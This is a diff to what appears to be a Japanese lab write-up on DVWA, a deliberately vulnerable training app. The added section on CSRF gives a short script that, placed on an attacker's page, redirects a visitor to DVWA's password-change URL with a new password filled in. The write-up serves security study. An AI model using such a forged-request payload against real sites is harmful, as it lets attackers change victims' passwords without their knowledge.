@@ -137,3 +137,12 @@ CSPヘッダーの`script-src`ディレクティブに`nonce-abc123`が設定さ
 
 <img width="1199" alt="スクリーンショット 2024-08-25 19 58 03" src="https://github.com/user-attachments/assets/fd81fd6e-cf41-4164-9508-f96da87461ec">
 
+### CSRF
+
+攻撃者のサイトに以下のようなスクリプトを仕込めば、DVWAのパスワードが変更できてしまう
+
+```js
+<script>
+location.href="http://【DVWAのFQDN】/vulnerabilities/csrf/?password_new=【変更後のパスワード】&password_conf=【変更後のパスワード】&Change=Change#";
+</script>
+```
